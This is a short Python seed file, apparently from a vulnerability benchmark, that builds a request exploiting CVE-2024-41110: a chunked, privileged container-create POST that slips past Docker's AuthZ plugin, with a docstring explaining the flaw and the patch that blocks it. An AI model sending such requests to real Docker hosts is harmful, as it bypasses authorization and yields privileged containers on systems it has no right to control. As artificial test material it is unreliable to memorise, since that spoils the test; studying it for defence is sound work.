#!/usr/bin/env python3
"""[GIVEN] CVE-2024-41110 seed exploit — Moby/Docker Engine AuthZ plugin bypass via a body
the plugin is never shown (the 2019 regression: chunked / Content-Length:0 request).

Pre-CVE-2024-41110, (*Ctx).AuthZRequest forwarded the body to the AuthZ plugin only when
`r.ContentLength > 0`. A `POST /v1.45/containers/create` sent with Transfer-Encoding: chunked
has ContentLength == -1, so the plugin was shown an EMPTY body and default-ALLOWED it, while
the daemon read the full chunked body and created the privileged container.

Contract: reaches the flag on V0; BLOCKED on V1. The CVE-2024-41110 fix (given in patch.diff)
added the `|| isChunked(r)` branch to the predicate, so on V1 the chunked privileged body IS
shown to the plugin -> DENY. This is the seed the system-under-test is given.
"""
from __future__ import annotations

# A privileged container-create request delivered CHUNKED so ContentLength == -1.
BODY = '{"Privileged":true}'


def candidate() -> dict:
    """Request candidate: POST /v1.45/containers/create, chunked privileged body."""
    return {
        "probe_id": "cve-2024-41110-chunked-body-authz-bypass",
        "method": "POST",
        "endpoint": "/v1.45/containers/create",
        "content_type": "application/json",
        "mode": "chunked",       # Transfer-Encoding: chunked, no Content-Length (=> r.ContentLength -1)
        "body": BODY,
    }


if __name__ == "__main__":
    print(candidate())
